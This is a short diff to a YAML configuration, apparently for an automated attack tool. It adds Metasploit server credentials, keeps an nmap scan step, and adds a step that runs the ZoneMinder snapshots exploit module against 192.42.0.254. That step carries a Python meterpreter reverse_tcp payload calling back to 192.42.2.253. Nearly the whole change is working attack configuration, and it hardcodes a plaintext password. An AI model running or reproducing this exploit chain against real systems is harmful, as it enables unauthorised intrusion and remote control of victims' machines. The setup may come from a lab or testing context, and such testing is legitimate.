@@ -1,4 +1,7 @@
 ###
+msf_config:
+  password: hackhelfer
+  server: 10.18.3.86
 
 vars:
   $SERVER_ADDRESS: localhost
@@ -15,5 +18,10 @@ commands:
   - type: shell
     cmd: nmap $SERVER_ADDRESS
     error_if: .*test.*
-    error_if_not: ipp
-    loop_if_not: ippa
+
+  - type: msf-module
+    cmd: exploit/unix/webapp/zoneminder_snapshots
+    options:
+      RHOSTS: 192.42.0.254
+      LHOST: 192.42.2.253
+    payload: cmd/unix/python/meterpreter/reverse_tcp
